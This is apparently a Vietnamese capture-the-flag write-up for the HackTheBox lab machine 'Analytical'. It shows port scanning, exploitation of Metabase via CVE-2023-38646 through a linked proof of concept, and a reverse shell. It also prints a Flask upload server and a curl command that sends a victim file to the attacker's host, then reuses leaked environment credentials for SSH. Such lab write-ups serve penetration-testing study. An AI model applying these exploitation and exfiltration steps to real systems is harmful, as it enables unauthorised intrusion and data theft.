## Analytical

- Port Scanning:
```
┌──(root㉿kali)-[/home/kali]
└─# nmap -sV -sC -p- -A 10.10.11.233
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-28 03:59 EST
Nmap scan report for 10.10.11.233
Host is up (0.050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

- Thêm hostname cho IP ở port 80 trong file `/etc/hosts`
- Khi click vào trang login trang redirect tới subdomain data (Phải khai báo thêm subdomain trong `/etc/hosts` mới truy cập được)
- Ở trang login `http://data.analytical.htb/auth/login` nhận thấy đây sử dụng metabase (một nguồn mở được thiết kế để giúp người dùng tạo và chia sẻ báo cáo, truy vấn và trực quan hóa dữ liệu một cách dễ dàng)
- Search `metadata exploit` nhận thấy có thể khai thác bằng CVE-2023-38646 với [POC](https://github.com/m3m0o/metabase-pre-auth-rce-poc)
- Chỉ cần lấy được setup-token` bị lộ trong api `/api/sessions/propertise`

![image](https://github.com/capy3ra/HackTheBox/assets/80744099/d1b482b9-8788-405e-8558-73d17fec5d27)

- Tạo rev shell

![image](https://github.com/capy3ra/HackTheBox/assets/80744099/70bfc2b0-4806-4021-b5db-03e7923a1244)

- Ở đây trên server, nhận thấy có các file như `metabase.db.mv.db`, `metabase.db.mv.db.trace`, `metabase.jar`, `run_metabase.sh` ...
- Để tải những file đấy về máy kali, tôi tạo một http server với flask
```
from flask import Flask, request

app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload():
    uploaded_file = request.files['file']
    uploaded_file.save('/home/kali/upload' + uploaded_file.filename)
    return 'File uploaded successfully!'

if __name__ == '__main__':
    app.run(host='10.10.14.61', port=8888)
```
- Rồi ở phía victim chạy lệnh curl để up file về máy kali `curl -F file=@/app/run_metabase.sh http://10.10.14.61:8888/upload`
- Đọc file `run_metabase.sh` nhận thấy có vẻ khi install metabase thì cần tạo một vài biến môi trường.
- Truy xuất các biến môi trường

![image](https://github.com/capy3ra/HackTheBox/assets/80744099/a538b941-6d3b-47c0-aa73-39f1505b6807)

- Nhận thấy có 2 biến `META_USER` `META_PASS` chứa giá trị, rất có thể là credential ssh
```
┌──(kali㉿kali)-[~]
└─$ ssh metalytics@10.10.11.233
metalytics@10.10.11.233's password:
```
- Lấy được flag của user.
